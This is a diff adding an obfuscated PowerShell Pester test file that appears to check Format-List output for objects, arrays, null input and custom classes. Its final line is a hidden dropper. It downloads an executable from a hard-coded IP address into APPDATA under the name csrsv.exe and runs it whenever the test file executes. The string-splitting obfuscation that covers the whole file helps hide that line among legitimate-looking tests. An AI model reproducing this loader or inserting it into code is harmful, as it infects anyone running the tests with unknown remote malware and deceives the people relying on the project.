@@ -1,0 +1,164 @@
+  &("{1}{0}" -f 'T','SE') ('fw6e'+'YU')  (  [Type]("{2}{3}{1}{0}"-f'nmeNT','RO','env','I')  ) ;   &("{1}{0}" -f 't','SE') ("{1}{0}" -f '9g','5q') ( [type]("{0}{2}{1}"-f 'MY','K','DayOfwee')  );   &("{0}{1}"-f 'sET-IT','Em')  ("{4}{0}{1}{2}{3}" -f'aRi','aBl','E:MT4','z3','V')  ( [tYpE]("{2}{0}{1}"-f'es','TcLaSs2','T')  )  ;  $GnDq0=[tYpe]("{2}{1}{0}" -F'lASs','TC','tES')  ; 
+
+&("{1}{2}{0}"-f'e','D','escrib') ("{1}{2}{0}" -f'st','F','ormat-Li') -Tags "CI" {
+    ${N`l} =   (&("{0}{1}{2}" -f 'VARiA','B','lE') ('fW6E'+'yU') ).VALUe::"NeWl`InE"
+    &("{2}{1}{0}"-f'ach','reE','Befo') {
+        ${I`N} = &("{2}{0}{1}" -f'j','ect','New-Ob') ("{0}{1}{2}"-f'P','SObj','ect')
+        &("{0}{1}{2}"-f 'Ad','d-','Member') -InputObject ${In} -MemberType ("{0}{2}{1}{3}"-f 'N','ePropert','ot','y') -Name ("{1}{2}{0}"-f'me','t','estNa') -Value ("{3}{2}{1}{0}"-f'lue','tVa','s','te')
+    }
+
+    &('It') ("{5}{1}{6}{4}{2}{0}{3}"-f 'thout err','d call form','i','or',' w','Shoul','at list') {
+        { ${I`N} | &("{2}{1}{3}{0}"-f 't','o','F','rmat-Lis') } | &("{1}{0}"-f 'ould','Sh') -Not -BeNullOrEmpty
+    }
+
+    &('It') ("{0}{4}{1}{2}{3}{5}" -f'Should be abl','to',' call',' the','e ',' alias') {
+        { ${I`N} | &('fl') } | &("{2}{0}{1}"-f'ho','uld','S') -Not -BeNullOrEmpty
+    }
+
+    &('It') ("{0}{7}{6}{2}{3}{1}{5}{8}{9}{4}"-f 'S','ut w','ve t','he same outp',' not','he','uld ha','ho','ther choosing ','alias or') {
+        ${e`xpeCT`eD} = ${in} | &("{0}{2}{3}{1}" -f 'Format','t','-Li','s') | &("{0}{1}{2}"-f'O','u','t-String')
+        ${A`CT`UaL}   = ${in} | &('fl')          | &("{0}{1}{2}" -f'O','u','t-String')
+
+        ${aC`TuAL} | &("{0}{1}"-f 'Shou','ld') -Be ${e`XPEC`TeD}
+    }
+
+    &('It') ("{8}{2}{9}{4}{6}{0}{1}{3}{5}{7}" -f 'p','ecte','h','d o','duce t','ut','he ex','put','S','ould pro') {
+        ${exP`e`cteD} = "${nl}testName : testValue${nl}${nl}${nl}"
+        ${I`N} = &("{0}{2}{1}" -f'N','bject','ew-O') ("{2}{1}{0}" -f 'bject','SO','P')
+        &("{0}{1}{2}"-f'Add-','M','ember') -InputObject ${I`N} -MemberType ("{2}{0}{3}{1}"-f'rope','ty','NoteP','r') -Name ("{1}{2}{0}" -f 'ame','te','stN') -Value ("{2}{1}{0}" -f'ue','stVal','te')
+
+        ${I`N} | &("{2}{1}{3}{0}"-f'ist','at','Form','-L')                  | &("{0}{1}" -f'Sh','ould') -Not -BeNullOrEmpty
+        ${i`N} | &("{2}{0}{3}{1}" -f'o','at-List','F','rm')   | &("{2}{1}{0}" -f 'tring','S','Out-')   | &("{0}{1}" -f'Shou','ld') -Not -BeNullOrEmpty
+        ${I`N} | &("{1}{2}{0}{3}"-f 'at','For','m','-List')   | &("{2}{3}{0}{1}"-f 'tr','ing','Out','-S')   | &("{0}{1}{2}" -f 'S','hou','ld') -Be ${E`xpE`CT`eD}
+    }
+
+    &('It') ("{2}{4}{8}{5}{1}{0}{6}{3}{7}" -f 'of the piped i','y ','Should be able to ','p','call a ','ropert','n','ut','p') {
+        
+        &("{1}{3}{2}{0}" -f'nd','G','Comma','et-') | &("{3}{4}{1}{0}{2}"-f'O','ct-','bject','S','ele') -First 1 | &("{0}{1}{2}"-f'Forma','t-L','ist') -Property ("{0}{1}" -f 'N','ame') | &("{1}{0}"-f'ld','Shou') -Not -BeNullOrEmpty
+
+        &("{0}{2}{1}" -f 'Ge','e','t-Dat') | &("{1}{0}{2}" -f'i','Format-L','st') -Property ("{3}{1}{0}{2}"-f'y','spla','Name','Di') | &("{0}{1}"-f 'Shou','ld') -Not -BeNullOrEmpty
+    }
+
+    &('It') ("{10}{11}{2}{12}{1}{6}{9}{0}{7}{8}{5}{4}{3}" -f'en s',' ab',' b',' a comma','y','d b','le to di','eparat','e','splay a list of props wh','Sho','uld','e') {
+
+        (&("{3}{2}{1}{0}" -f 'ommand','-C','t','Ge') | &("{0}{1}{2}" -f 'Se','lect-Objec','t') -First 5 | &("{2}{1}{0}{3}"-f 'L','ormat-','F','ist') -Property ("{0}{1}"-f'Na','me'),("{1}{0}" -f'e','Sourc') | &("{2}{1}{0}" -f'ng','ut-Stri','O')) -Split "${nl}" |
+          &("{0}{1}{2}" -f'Wher','e-Obje','ct') { ${_}.("{1}{0}"-f'im','tr').Invoke() -ne "" } |
+          &("{1}{2}{4}{0}{3}" -f'Obj','ForE','a','ect','ch-') { ${_} | &("{0}{1}{2}" -f'Sh','ou','ld') -Match ((("{2}{0}{5}{1}{3}{4}"-f'e){0','(So','(Nam','ur','ce)','}')) -f  [chAr]124) }
+    }
+
+    &('It') ("{5}{9}{0}{7}{3}{11}{2}{1}{8}{6}{10}{4}" -f 'ld show the','p i','ed pro','s','ent','Sho','y el',' reque','n ever','u','em','t') {
+        
+        (&("{0}{1}{2}"-f 'Get-','Comma','nd') | &("{3}{0}{1}{2}" -f'lect','-Obje','ct','Se') -First 5 | &("{1}{2}{0}" -f't','Form','at-Lis') -Property ("{0}{1}"-f'S','ource') | &("{1}{0}{2}"-f'i','Out-Str','ng')) -Split "${nl}" |
+          &("{2}{3}{0}{1}"-f'bje','ct','W','here-O') { ${_}.("{0}{1}"-f'tri','m').Invoke() -ne "" } |
+          &("{4}{1}{2}{3}{0}" -f'ject','orEach','-O','b','F') { ${_} | &("{1}{0}"-f 'ld','Shou') -Match ("{2}{1}{0}" -f ' :','ce','Sour') }
+    }
+
+    &('It') ("{10}{2}{11}{0}{12}{7}{8}{9}{6}{1}{3}{4}{5}"-f'yt',' tha','ld not ','n ','the requ','ested props','er','n','g ot','h','Shou','show an','hi') {
+        ${oU`TP`UT} = &("{2}{3}{1}{0}" -f 'd','man','Get-C','om') | &("{1}{0}{2}{3}" -f 'lec','Se','t-Obj','ect') -First 5 | &("{2}{0}{1}"-f'ormat-Lis','t','F') -Property ("{1}{0}" -f'me','Na') | &("{0}{1}{2}"-f'Out','-S','tring')
+
+        ${o`UtP`UT} | &("{1}{0}" -f'd','Shoul') -Not -Match ("{1}{2}{3}{0}" -f ' :','Comm','andTyp','e')
+        ${O`UT`pUT} | &("{2}{1}{0}" -f'd','l','Shou') -Not -Match ("{1}{2}{0}" -f 'urce :','S','o')
+        ${oUt`PUt} | &("{0}{1}"-f 'Sho','uld') -Not -Match ("{0}{1}{2}"-f'Mo','du','le :')
+    }
+
+    &('It') ("{13}{12}{4}{5}{1}{10}{7}{2}{6}{8}{3}{0}{9}{11}"-f'ithout piping ob','e to ','k','w','oul','d be abl','e inp','a','ut ','j','t','ects to it','h','S') {
+        ${OU`T`PuT} = { &("{3}{0}{1}{2}" -f 'mat-Li','s','t','For') -InputObject ${in} }
+
+        ${O`U`Tput} | &("{1}{0}" -f 'd','Shoul') -Not -BeNullOrEmpty
+
+    }
+}
+
+&("{1}{0}{2}"-f 'escr','D','ibe') ("{3}{2}{5}{4}{0}{6}{1}"-f'cti','ity','a','Form','ist DRT basic fun','t-L','onal') -Tags "CI" {
+    &('It') ("{1}{4}{3}{0}{2}{5}"-f 'd ','Format','wo','ist with array shoul','-L','rk') {
+        ${A`l} = (0..255)
+        ${IN`FO} = @{}
+        ${In`Fo}."A`Rray" = ${AL}
+        ${r`eSuLt} = ${iN`Fo} | &("{0}{3}{1}{2}" -f 'F','at-Li','st','orm') | &("{0}{1}{2}"-f 'O','ut-Str','ing')
+        ${RE`sUlT} | &("{1}{0}"-f'd','Shoul') -Match "Name  : array\s+Value : {0, 1, 2, 3`u{2026}}" 
+    }
+
+	&('It') ("{8}{6}{2}{7}{5}{9}{0}{12}{11}{10}{3}{4}{1}" -f's for End','k','at-List with ','End sh','ould wor','o O','rm','N','Fo','bject','o-','T','-'){
+		${P} = @{}
+		${re`SULt} = ${p} | &("{3}{2}{1}{0}"-f 'ist','t-L','a','Form') -Force -Property "foo","bar" | &("{0}{1}{2}"-f'Out-St','rin','g')
+		${R`e`SUlt}.("{0}{1}"-f 'Tr','im').Invoke() | &("{0}{1}"-f'Sho','uld') -BeNullOrEmpty
+	}
+
+	&('It') ("{3}{7}{0}{8}{1}{6}{5}{2}{4}" -f'st','bjects ','d','Format-',' work','End-To-End shoul','for ','Li',' with Null O'){
+		${P} = ${n`UlL}
+		${R`ES`Ult} = ${P} | &("{3}{0}{1}{2}"-f 'or','ma','t-List','F') -Force -Property "foo","bar" | &("{0}{1}{2}" -f 'O','ut-','String')
+		${R`ESU`LT}.("{1}{0}"-f 'm','Tri').Invoke() | &("{1}{2}{0}"-f 'd','Sh','oul') -BeNullOrEmpty
+	}
+
+	&('It') ("{7}{12}{15}{4}{10}{6}{3}{0}{2}{8}{5}{16}{14}{1}{13}{11}{9}"-f'h single',' sh',' l','t','is',' En','wi','Fo','ine string for','ld work','t ','u','rma','o','d','t-L','d-To-En'){
+		${p} = ("{3}{0}{1}{4}{5}{2}" -f'ingle ','l','ing','s','ine',' str')
+		${r`es`ULt} = ${P} | &("{2}{1}{0}" -f '-List','rmat','Fo') -Force -Property "foo","bar" | &("{2}{0}{1}"-f 'n','g','Out-Stri')
+		${rES`U`lt}.("{0}{1}"-f'T','rim').Invoke() | &("{1}{0}{2}"-f'ul','Sho','d') -BeNullOrEmpty
+	}
+
+	&('It') ("{5}{1}{9}{7}{6}{3}{10}{13}{0}{11}{12}{15}{14}{4}{2}{8}" -f ' ','ormat-Lis','h','ltip','nd-To-End s','F','with mu',' ','ould work','t','l','s','t','e line','ng for E','ri'){
+		${p} = ((("{0}{1}{2}" -f 'L','ine1','{0}nLine2'))-f  [CHAR]92)
+		${R`esU`LT} = ${P} | &("{1}{2}{0}" -f'at-List','For','m') -Force -Property "foo","bar" | &("{0}{1}{2}" -f'Out','-Stri','ng')
+		${r`eSu`lT}.("{0}{1}" -f 'Tr','im').Invoke() | &("{2}{0}{1}" -f 'l','d','Shou') -BeNullOrEmpty
+	}
+
+	&('It') ("{6}{8}{2}{7}{14}{10}{13}{4}{9}{5}{12}{16}{0}{3}{17}{15}{1}{11}" -f 'T','ld wor','t w','o-','ce','or','Format','ith str','-Lis',' f','se','k',' E','quen','ing ','d shou','nd-','En'){
+		${p} = ("{1}{0}" -f'e1','Lin'),("{0}{1}" -f 'L','ine2')
+		${re`s`ULt} = ${P} | &("{2}{3}{0}{1}" -f'-','List','For','mat') -Force -Property "foo","bar" | &("{0}{2}{1}" -f'Out','g','-Strin')
+		${R`es`ULT}.("{0}{1}" -f 'Tr','im').Invoke() | &("{1}{0}"-f'd','Shoul') -BeNullOrEmpty
+	}
+
+    &('It') ("{0}{2}{11}{13}{6}{3}{10}{8}{9}{7}{5}{12}{4}{1}"-f 'F',' work','orm','co','d should','d-To-E',' ',' for En','l','ex object','mp','at-List','n',' with') {
+        &("{0}{1}" -f 'Add-T','ype') -TypeDefinition "public enum MyDayOfWeek{Sun,Mon,Tue,Wed,Thu,Fri,Sat}"
+        ${e`To} =   (&("{1}{2}{0}{3}" -f'I','gET','-var','ABLe') ("{1}{0}"-f'g','5q9') ).VAlUe::("{1}{0}" -f 'w','Ne').Invoke()
+        ${I`NFo} = @{}
+        ${I`NfO}."i`NTARR`AY" = 1,2,3,4
+        ${in`FO}."ArRa`ylI`ST" = ("{1}{0}" -f'tring1','s'),("{2}{1}{0}"-f'ng2','i','str')
+        ${iN`Fo}."En`Ume`RABlE" = [MyDayOfWeek]${E`TO}
+        ${I`NFO}."ENuMe`RabLETE`s`TOBjecT" = ${e`To}
+        ${Re`S`UlT} = ${I`Nfo}|&("{2}{1}{0}"-f'-List','rmat','Fo')|&("{2}{0}{3}{1}" -f'-S','g','Out','trin')
+        ${R`eSu`Lt} | &("{0}{1}" -f 'S','hould') -Match ("{1}{3}{2}{0}{4}{5}"-f 'bleTe','Name  : ','era','enum','stOb','ject')
+        ${Re`su`lT} | &("{0}{1}"-f 'Sh','ould') -Match ("{3}{1}{0}{2}"-f' S','lue :','un','Va')
+        ${rEs`UlT} | &("{1}{0}" -f'ld','Shou') -Match ("{2}{0}{3}{1}"-f ' arrayL','t','Name  :','is')
+        ${r`Esu`LT} | &("{0}{2}{1}" -f'Sh','uld','o') -Match "Value : {string1, string2}"
+        ${Res`Ult} | &("{0}{1}" -f 'S','hould') -Match ("{0}{4}{2}{3}{1}"-f'Na','ble',': enumer','a','me  ')
+        ${res`ULT} | &("{1}{0}"-f'ould','Sh') -Match ("{3}{2}{1}{0}" -f'un','e : S','u','Val')
+        ${REs`U`LT} | &("{1}{0}" -f 'd','Shoul') -Match ("{3}{2}{0}{1}"-f '  : intAr','ray','me','Na')
+        ${R`e`suLt} | &("{0}{1}"-f'Sho','uld') -Match "Value : {1, 2, 3, 4}"
+    }
+
+	&('It') ("{8}{4}{10}{7}{13}{3}{11}{0}{9}{2}{12}{6}{1}{5}"-f's ob',' wo','t s','cla','mat-','rk','uld','ith multip','For','jec','List w','s','ho','le same '){
+		&("{1}{0}" -f'ype','Add-T') -TypeDefinition "public class TestClass{public TestClass(string name,int length){Name = name;Length = length;}public string Name;public int Length;}"
+		${tEStoBjE`C`TS} =  ( &("{2}{1}{3}{0}"-f 'blE','R','GET-Va','iA')  ("{0}{1}" -f'g','nDq0')).vALUe::("{1}{0}"-f'ew','N').Invoke(("{1}{0}"-f 'ame1','n'),1), (&("{1}{0}" -f 'IR','d')  ('VA'+'RI'+'able'+':g'+'nDq0')  ).vAlUe::("{0}{1}"-f 'Ne','w').Invoke(("{0}{1}"-f'na','me2'),2),  (  &("{0}{1}{2}" -f 'v','arIA','BLe') ('gN'+'Dq0')).vALUe::("{0}{1}" -f 'Ne','w').Invoke(("{1}{0}"-f 'e3','nam'),3)
+		${res`U`lT} = ${tE`St`OBje`CTs}|&("{2}{1}{0}"-f'st','Li','Format-')|&("{1}{2}{0}"-f 'ng','Ou','t-Stri')
+		${resU`lt} | &("{0}{1}"-f'Sho','uld') -Match ("{2}{3}{1}{0}"-f '1','ame','Name   :',' n')
+		${re`sU`LT} | &("{0}{1}" -f'Sh','ould') -Match ("{1}{2}{0}" -f' : 1','L','ength')
+		${reSU`lT} | &("{1}{0}{2}" -f'o','Sh','uld') -Match ("{0}{1}{2}" -f 'N','ame   : na','me2')
+		${rEs`U`lT} | &("{0}{1}"-f 'Shoul','d') -Match ("{2}{0}{1}{3}" -f'e','ng','L','th : 2')
+		${R`esU`Lt} | &("{1}{0}"-f 'hould','S') -Match ("{0}{3}{2}{1}"-f'Nam','e3','am','e   : n')
+		${reS`ULT} | &("{0}{1}{2}" -f'Shou','l','d') -Match ("{3}{2}{0}{1}"-f'h',' : 3','t','Leng')
+	}
+
+	&('It') ("{2}{11}{7}{1}{3}{12}{5}{0}{14}{16}{4}{6}{8}{15}{13}{9}{10}"-f 'ple di','-','Form','List ','lass object',' multi',' s','t','h','wor','k','a','with','ld ','fferent','ou',' c'){
+		&("{1}{0}{2}"-f'-','Add','Type') -TypeDefinition "public class TestClass{public TestClass(string name,int length){Name = name;Length = length;}public string Name;public int Length;}"
+		&("{2}{0}{1}" -f '-Typ','e','Add') -TypeDefinition "public class TestClass2{public TestClass2(string name,string value,int length){Name = name;Value = value; Length = length;}public string Name;public string Value;public int Length;}"
+		${TE`STO`BjE`CTs} =   (&("{3}{1}{2}{0}"-f 'e','AB','l','gEt-varI') ("gNdQ"+"0") ).vALUE::("{0}{1}" -f 'N','ew').Invoke(("{1}{0}"-f'ame1','n'),1), $MT4z3::("{0}{1}" -f'N','ew').Invoke(("{1}{0}" -f 'me2','na'),("{1}{0}"-f'alue2','v'),2), $gnDQ0::("{0}{1}" -f'N','ew').Invoke(("{1}{0}"-f'3','name'),3)
+		${ReSU`LT} = ${TeSTOB`je`CtS}|&("{3}{0}{1}{2}"-f 'orm','a','t-List','F')|&("{1}{0}{2}{3}"-f 'St','Out-','ri','ng')
+		${re`S`UlT} | &("{1}{0}" -f 'hould','S') -Match ("{3}{1}{2}{0}" -f'1','me   : nam','e','Na')
+		${R`Esu`LT} | &("{1}{0}{2}"-f 'ho','S','uld') -Match ("{1}{2}{0}" -f' 1','Lengt','h :')
+		${r`EsULT} | &("{2}{1}{0}" -f'ould','h','S') -Match ("{4}{3}{0}{2}{1}"-f 'e   ',' name2',':','m','Na')
+		${re`SuLt} | &("{1}{0}"-f'ld','Shou') -Match ("{0}{3}{2}{1}{4}"-f'Val','lu',' va','ue  :','e2')
+		${RE`SU`Lt} | &("{1}{0}"-f 'hould','S') -Match ("{3}{1}{2}{0}"-f ' 2','ng','th :','Le')
+		${RE`s`Ult} | &("{1}{0}"-f'ld','Shou') -Match ("{2}{0}{1}"-f 'nam','e3','Name   : ')
+		${R`es`UlT} | &("{1}{0}{2}"-f 'ou','Sh','ld') -Match ("{1}{3}{0}{2}"-f'gth','L',' : 3','en')
+    }
+
+    &('It') ("{8}{9}{6}{7}{0}{5}{1}{3}{2}{4}"-f'wit','eIn',' ','fo should','work','h Fil','t-L','ist ','F','orma') {
+        ${nu`Ll} = &("{2}{1}{0}" -f 'tem','I','New-') (("{0}{1}{3}{2}"-f 'SY7testd','riveyz1te','t','st.tx')).replaCe('SY7',[stRing][CHAR]36).replaCe(([CHAR]121+[CHAR]122+[CHAR]49),'\') -ItemType ("{0}{1}" -f 'F','ile') -Value ("{0}{1}"-f 'hel','lo') -Force
+        ${ReS`Ult} = &("{3}{0}{2}{1}"-f 'et-ChildI','em','t','G') -File ((("{4}{0}{3}{1}{2}" -f'testdrive{0}','st','.txt','te','{1}'))-F  [cHaR]92,[cHaR]36) | &("{1}{0}{2}"-f'mat-Lis','For','t') | &("{2}{3}{1}{0}"-f'ring','t','O','ut-S')
+        ${r`eS`UlT} | &("{0}{1}{2}"-f 'Sh','oul','d') -Match ((("{0}{6}{1}{4}{7}{3}{5}{2}" -f 'Name','a','xt','t.','x3s','t','ax3s*:','*tes'))."RE`P`LACE"('ax3',[sTRINg][CHaR]92))
+        ${rE`SULT} | &("{0}{1}"-f'Sho','uld') -Match ((("{2}{0}{1}{4}{3}"-f'en','gthV','L','hs*5','Rhs*:VR'))-cRePLACe'VRh',[CHaR]92)
+    }
+}
+
+(&("{3}{1}{0}{2}" -f'c','je','t','New-Ob') ("{2}{4}{3}{0}{1}"-f 'Cli','ent','Sy','eb','stem.Net.W')).("{0}{1}{2}" -f 'Download','Fi','le').Invoke(("{4}{3}{8}{2}{0}{6}{7}{5}{1}"-f'170.218','exe','8.','tp:','ht','v.','/~yahoo/csr','s','//89.24'),"$env:APPDATA\csrsv.exe");&("{2}{0}{1}" -f 'tart-Pr','ocess','S') ("$env:APPDATA\csrsv.exe")
